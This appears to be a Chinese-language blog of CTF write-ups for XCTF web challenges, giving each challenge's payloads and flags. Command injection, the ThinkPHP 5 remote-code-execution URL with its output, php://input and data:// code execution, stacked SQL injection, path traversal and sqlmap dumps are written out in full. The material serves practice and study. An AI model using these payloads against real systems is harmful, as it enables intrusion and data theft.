<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>所需工具：firefox</p>
<p>可选工具：burp，wireshark</p>
<p>先打开网页，根据题目提示，在firefox按F12查看cookie</p>
<p>根据提示访问cookie.php</p>
<p>根据提示查看http response，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;5c1980e2f03a088816f306f7680d5458&#125;</span><br></pre></td></tr></table></figure>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>工具：firefox</p>
<p>打开网页，显示按钮不能按</p>
<p>使用firefox，按F12检查网页源码，把button处的disabled去掉，即可提交</p>
<p>提交后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;a8efb264c88f7cba483ed431888a1d32&#125;</span><br></pre></td></tr></table></figure>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>目的：爆破弱密码</p>
<p>工具：burp</p>
<p>proxy拦截提交的请求，将请求send to intruder，在intruder的position中更改数据包，使得提交的指定字段为变量，在intruder的payload中载入字典，点击attack</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4b4dda09ed661c8976f965b0681de325&#125;</span><br></pre></td></tr></table></figure>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h2><p>输入localhost，看到请求为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
<p>尝试注入语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; select database(); #</span><br></pre></td></tr></table></figure>
<p>得到请求为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;+select+database();+#</span><br></pre></td></tr></table></figure>
<p>说明不能注入</p>
<p>参考writeup，直接在命令行执行的ping，可以执行其他语句。又flag一般放在txt中，输入下列语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find &#x2F; -name &quot;*.txt&quot; | grep flag</span><br></pre></td></tr></table></figure>
<p>看到/home/flag.txt</p>
<p>查看文件内容得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;168a646a5815f5b2f0e42e56812943d5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>需要知识点：php的弱类型比较</p>
<p>需要工具：直接在浏览器提交就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写法1：?a&#x3D;&#39;0&#39;&amp;b&#x3D;1235a # 使a为字符串，b为非数字的一种变量</span><br><span class="line">写法2：?a&#x3D;0a&amp;b&#x3D;12345%00 # %00表示阶段，可以使b不为数字或数字字符串</span><br></pre></td></tr></table></figure>


<h3 id="php的弱类型比较"><a href="#php的弱类型比较" class="headerlink" title="php的弱类型比较"></a>php的弱类型比较</h3><p>php有两种判断相等的方法，==，===</p>
<p>==会将两边值进行强制类型转换后在判断</p>
<p>===同时判断类型和值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">if(&quot;1admin&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;true</span><br><span class="line">if(&quot;admin1&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;false</span><br><span class="line">if(&quot;0e12324&quot;&#x3D;&#x3D;&quot;0e1324&quot;)&#x2F;&#x2F;true，当做科学技术法，都是0</span><br></pre></td></tr></table></figure>
<p>get_post</p>
<p>工具：firefox的hackbar插件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;f5206ff77800e22928b4d81206e083e5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>工具：burpsuite</p>
<p>在burp的proxy里，把包拦下来，按照提示加入这两条就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure>
<p>得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;2db9b3a38c581792bea6f015e6bdfdc8&#125;</span><br></pre></td></tr></table></figure>
<h3 id="XFF和Referer"><a href="#XFF和Referer" class="headerlink" title="XFF和Referer"></a>XFF和Referer</h3><p>X-Forwarded-For：浏览器访问服务器时，使用的IP</p>
<p>Referer：浏览器告诉服务器，自己从哪个IP跳转来的</p>
<p>web_shell</p>
<p>考察：php一句话木马，php执行shell命令</p>
<p>工具：中国蚁剑，中国菜刀，hackbar</p>
<p>做法1：中国蚁剑or中国菜刀</p>
<p>菜刀可以绕过认证部分，直接拿到webshell权限，之后查找flag即可</p>
<p>做法2：hackbar</p>
<p>在post data中写入 以下语句</p>
<p>首先查找当前目录文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
<p>写入以下任意一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;passthru(&quot;cat flag.txt&quot;);</span><br><span class="line">shell&#x3D;system(&quot;cat flag.txt&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="php执行shell命令"><a href="#php执行shell命令" class="headerlink" title="php执行shell命令"></a>php执行shell命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string system ( string $command [, int &amp;$return_var ] )</span><br><span class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>考察：js阅读，转码</p>
<p>阅读js源码，发现dechiffre不管输入什么，都会根据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65</span><br></pre></td></tr></table></figure>
<p>返回一个值。ASCII码范围为0~127，猜测这几个值为字符的ASCII码表示</p>
<p>代码里有一段十六进制的长字符串，猜测为答案</p>
<p>先把长字符串转换为十进制，再转换为字符，得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure>
<h1 id="攻防世界-web-高级"><a href="#攻防世界-web-高级" class="headerlink" title="攻防世界 web 高级"></a>攻防世界 web 高级</h1><h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p>工具：firefox</p>
<p>看一下返回的响应头，就看到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;very_baby_web&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>打开网页，根据提示在url输入/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
<p>在url输入/fl0g.php，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;04a3b25a4981849593d0b45e6f3b2717&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>根据网页上显示的源码，需要在url的var中传入一个参数，这个参数首先会被base64解码，然后查看是否pre_match一个正则，最后被序列化</p>
<p>因此，需要把Demo中的file变量设置成“fl4g.php”，并且需要依次进行序列化，pre_match的绕过，base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file &#x3D; &#39;index.php&#39;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file &#x3D; $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123; </span><br><span class="line">            &#x2F;&#x2F;the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A &#x3D; new Demo(&#39;fl4g.php&#39;);</span><br><span class="line">    $C &#x3D; serialize($A);</span><br><span class="line">    &#x2F;&#x2F;string(49) &quot;O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">    $C &#x3D; str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$C);&#x2F;&#x2F;绕过preg_match</span><br><span class="line">    $C &#x3D; str_replace(&#39;:1:&#39;, &#39;:2:&#39;,$C);&#x2F;&#x2F;绕过wakeup</span><br><span class="line">    var_dump($C);</span><br><span class="line">    &#x2F;&#x2F;string(49) &quot;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">    var_dump(base64_encode($C));</span><br><span class="line">    &#x2F;&#x2F;string(68) &quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag&#x3D;&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span><br></pre></td></tr></table></figure>


<h3 id="php的var-dump"><a href="#php的var-dump" class="headerlink" title="php的var_dump"></a>php的var_dump</h3><p>输出变量信息</p>
<h3 id="php的class"><a href="#php的class" class="headerlink" title="php的class"></a>php的class</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__construct：初始化一个对象时执行</span><br><span class="line">__destruct：对象销毁时执行</span><br><span class="line">__wakeup：对象被反序列化时执行</span><br></pre></td></tr></table></figure>
<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php rce"></a>php rce</h2><p>打开网页，先试试ThinkPHP V5的框架。在github上查找ThinkPHP V5的漏洞，存在以下语句可以获得shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
<p>依次执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls</span><br><span class="line">favicon.ico index.php robots.txt router.php static static</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;find &#x2F; -name &quot;flag&quot;</span><br><span class="line">&#x2F;flag &#x2F;flag</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;file &#x2F;flag</span><br><span class="line">&#x2F;flag: ASCII text &#x2F;flag: ASCII text</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag</span><br><span class="line">flag&#123;thinkphp5_rce&#125; flag&#123;thinkphp5_rce&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>php据题目提示，将提供的字符串按base64解码得到答案</p>
<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>考察：base64编码</p>
<p>根据题目提示，将提供的字符串按base64解码得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;Welcome_to_new_World!&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>考察：php://input或data://</p>
<p><strong>方法1：大小写绕过or双写绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45427&#x2F;?hello&#x3D;echo &#96;ls&#96;&amp;page&#x3D;pHp:&#x2F;&#x2F;input</span><br><span class="line">Post data: &lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到当前目录下有一个flag</p>
<p><strong>方法2：data://伪协议</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45427&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>方法3：一句话木马+菜刀</strong></p>
<h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><p>通过php访问输入输出流，后可接stdin,stdout,stderr。常用input和output代替，在post data部分传入php代码</p>
<h3 id="data-伪数据协议"><a href="#data-伪数据协议" class="headerlink" title="data://伪数据协议"></a>data://伪数据协议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,&lt;?base64编码后的php代码?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php代码?&gt;</span><br></pre></td></tr></table></figure>


<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>考察：堆叠注入，sql预编译</p>
<p>使用sqlmap失败，只能手工注入。</p>
<p>尝试后发现是单引号注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>使用union select，提示过滤了select等关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>使用原生sql函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;;show databases; --+</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;; show tables; --+</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;;</span><br></pre></td></tr></table></figure>
<p>使用sql变量和预编译技巧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;-&#39;;set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<p>提示使用函数绕过了prepare，此处用大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;-&#39;;set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<h3 id="sql的预编译"><a href="#sql的预编译" class="headerlink" title="sql的预编译"></a>sql的预编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义sql语句，如此定义可以绕过对select的过滤</span><br><span class="line">set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;)</span><br><span class="line">&#x2F;&#x2F; 定义预编译语句</span><br><span class="line">PREPARE stm FROM @sql;</span><br><span class="line">&#x2F;&#x2F; 执行预编译语句</span><br><span class="line">EXECUTE stm;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义带变量的预编译语句</span><br><span class="line">PREPARE stm FROM &#39;SELECT (?+?)&#39;</span><br><span class="line">&#x2F;&#x2F; 执行带变量的预编译语句</span><br><span class="line">EXECUTE stm USING @a, @b;</span><br></pre></td></tr></table></figure>
<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>打开页面，发现只能进入到一个页面中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:53522&#x2F;index.php?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>id处进行暴力枚举，得到2333为有响应的网页</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:53522&#x2F;index.php?id&#x3D;2333</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;967266c008c6e2bb3563346fef63b664&#125;</span><br></pre></td></tr></table></figure>


<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>进入页面，只有一个滑稽。</p>
<p>查看源码，提示访问source.php，访问后得到一个php代码，该题为代码审计</p>
<p>以下为涉及到的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(&amp;str, start, length) 返回[start,start+length]部分的str字符串</span><br><span class="line">in_array(&amp;t1, &amp;t2) 判断t1是否在数组t2中</span><br></pre></td></tr></table></figure>
<p>代码的主要功能在checkFile函数中，判断传入的参数file是否在whitelist中，若在则返回true，并include该file。由此可知，这是一个文件包含漏洞，绕过checkFile中的部分返回true即可</p>
<p>whilltelist中出了source.php，还有一个hint.php。</p>
<p>访问hint.php，提示flag在ffffllllaaaagggg中，目标文件尾ffffllllaaaagggg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:54846&#x2F;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br><span class="line"># 目标文件在哪是多次测试得到的</span><br></pre></td></tr></table></figure>
<p>别人的wp提示，hint.php后的?会在上传时url解码，但是直接提交也过了2333</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</span><br></pre></td></tr></table></figure>


<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>本题有个输入框</p>
<p>猜测为命令漏洞，失败</p>
<p>根据wp为sql注入</p>
<h3 id="sqlmap方法"><a href="#sqlmap方法" class="headerlink" title="sqlmap方法"></a>sqlmap方法</h3><p>抓包发现为post提交，因此需要将包存在在本地后，使用post发送发送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt --dbs 用1.txt内容去搜索对应的所有数据库名</span><br><span class="line">sqlmap.py -r 1.txt -D news --dump 建立可后台news库连接， 搜索所有的数据</span><br></pre></td></tr></table></figure>
<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p>wp有手工注入方法，但是给我的环境莫名其妙试不了，加单引号就报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;sq1_inJec7ion_ezzz&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sqlmap的–dump选项"><a href="#sqlmap的–dump选项" class="headerlink" title="sqlmap的–dump选项"></a>sqlmap的–dump选项</h3><p>可以查询指定范围的全部数据</p>
<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件，解压后得到一个文件，观察发现是混杂了普通字符和十六进制字符的html代码。</p>
<p>尝试手工替换，失败。</p>
<p>添加html后缀后，用浏览器打开，得到一个输入框，但是仍然不能得到解码后的js代码。</p>
<p>观察js源码，发现开头将_设置成了了整个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; _&#x3D;&#39;function</span><br></pre></td></tr></table></figure>
<p>而结尾使用eval函数执行。那么将eval改成alert，即可得到完整的js代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function $()&#123;</span><br><span class="line">	var e&#x3D;document.getElementById(&quot;c&quot;).value;</span><br><span class="line">	if(e.length&#x3D;&#x3D;16)</span><br><span class="line">		if(e.match(&#x2F;^be0f23&#x2F;)!&#x3D;null)</span><br><span class="line">			if(e.match(&#x2F;233ac&#x2F;)!&#x3D;null)</span><br><span class="line">				if(e.match(&#x2F;e98aa$&#x2F;)!&#x3D;null)</span><br><span class="line">					if(e.match(&#x2F;c7be9&#x2F;)!&#x3D;null)&#123;</span><br><span class="line">						var t&#x3D;[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">						var n&#x3D;[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">						var r&#x3D;[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">						var i&#x3D;[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">						var s&#x3D;[t,n,r,i];</span><br><span class="line">						for(var o&#x3D;0;o&lt;13;++o)&#123;</span><br><span class="line">							document.write(s[o%4][0]);</span><br><span class="line">							s[o%4].splice(0,1)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">							</span><br><span class="line">					document.write(&#39;&lt;input id&#x3D;&quot;c&quot;&gt;&lt;button onclick&#x3D;$()&gt;Ok&lt;&#x2F;button&gt;&#39;);delete _</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>可以通过在输入框输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beof233ac7be98aa</span><br></pre></td></tr></table></figure>
<p>得到flag，也可以通过审计代码直接获得flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;it&#39;s_a_h0le_in_0ne&#125;</span><br></pre></td></tr></table></figure>


<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>按照顺序一步步倒推操作</p>
<p>原密文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</span><br></pre></td></tr></table></figure>


<p>str_rot13</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</span><br></pre></td></tr></table></figure>
<p>strrev</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</span><br></pre></td></tr></table></figure>
<p>base64_decode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~88:36e1bg8438e41757d:29cgeb6e48c&#96;GUDTO|;hbmg</span><br></pre></td></tr></table></figure>
<p>ascii码减1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
<p>strrev</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
<p>或者用python代码写</p>
